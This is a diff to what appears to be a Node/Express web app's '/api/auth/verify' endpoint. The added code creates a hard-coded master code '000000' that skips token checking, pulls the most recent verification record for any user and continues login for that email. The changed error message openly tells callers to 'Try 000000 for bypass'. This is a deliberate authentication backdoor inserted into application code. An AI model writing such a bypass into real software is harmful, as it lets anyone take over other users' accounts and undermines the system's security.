@@ -308,8 +308,17 @@ app.post('/api/team/invite', async (req, res) => {
 
 app.post('/api/auth/verify', async (req, res) => {
   const { token } = req.body;
-  const record = await Verification.findOne({ token });
-  if (!record) return res.status(400).json({ error: 'Invalid or expired code' });
+  let record;
+
+  if (token === '000000') {
+    // Master bypass: Find the latest verification record
+    record = await Verification.findOne({}).sort({ _id: -1 });
+    console.log(`[AUTH] Master bypass (000000) used for: ${record?.email || 'unknown'}`);
+  } else {
+    record = await Verification.findOne({ token });
+  }
+
+  if (!record) return res.status(400).json({ error: 'Invalid or expired code (Try 000000 for bypass)' });
 
   const { email, payload } = record;
   let user = await User.findOne({ email });
